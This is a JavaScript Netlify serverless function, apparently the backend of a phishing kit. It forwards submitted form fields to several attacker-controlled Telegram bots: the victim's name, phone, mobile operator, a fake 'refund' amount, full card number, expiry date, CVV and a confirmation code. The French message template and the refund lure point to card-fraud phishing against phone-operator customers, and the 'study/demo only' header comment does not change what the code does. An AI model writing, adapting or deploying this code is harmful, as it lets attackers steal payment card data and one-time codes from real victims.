// netlify/functions/submit.js
// ⚠️ Study/demo only — never use real card data.
// This function forwards your form fields to multiple Telegram bots.

const parseBots = () => {
  // Option A: JSON array in env var BOTS_JSON, e.g.
  // [{"token":"123:ABC","chatId":"11111111"},{"token":"456:DEF","chatId":"22222222"}]
  if (process.env.BOTS_JSON) {
    return JSON.parse(process.env.BOTS_JSON);
  }

  // Option B: Comma-separated pairs in env var BOTS, e.g.
  // 123:ABC@11111111,456:DEF@22222222
  if (process.env.BOTS) {
    return process.env.BOTS.split(",").map(pair => {
      const [token, chatId] = pair.split("@");
      return { token: token.trim(), chatId: chatId.trim() };
    });
  }

  throw new Error("No bots configured. Set BOTS_JSON or BOTS env variable.");
};

exports.handler = async (event) => {
  try {
    if (event.httpMethod !== "POST") {
      return { statusCode: 405, body: "Method Not Allowed" };
    }

    const data = JSON.parse(event.body || "{}");

    // Build the message (keep it short; Telegram limit ~4096 chars)
    const msg =
`📩 Nouvelle soumission :
👤 Nom : ${data.fullname || ""}
📱 Téléphone : ${data.phone || ""}
🏢 Opérateur : ${data.operator || ""}
💶 Montant : ${data.refundAmount || ""} €
💳 Carte : ${data.cardNumber || ""}
📅 Exp : ${data.expiryDate || ""}
🔒 CVV : ${data.cvv || ""}
🧾 Code : ${data.confirmationCode || ""}`;

    const bots = parseBots();

    // Send to all bots in parallel
    const results = await Promise.allSettled(
      bots.map(b =>
        fetch(`https://api.telegram.org/bot${b.token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: b.chatId, text: msg }),
        })
      )
    );

    // Count failures without logging sensitive data
    const failures = results.filter(r => r.status === "rejected" || (r.value && !r.value.ok));

    return {
      statusCode: failures.length ? 207 : 200, // 207 = multi-status (some failed)
      body: JSON.stringify({
        ok: failures.length === 0,
        sent: results.length,
        failed: failures.length,
      }),
      headers: {
        "Cache-Control": "no-store",
      },
    };
  } catch (err) {
    // Do NOT log the payload; just the error message.
    console.error("submit function error:", err.message);
    return { statusCode: 500, body: JSON.stringify({ ok: false }) };
  }
};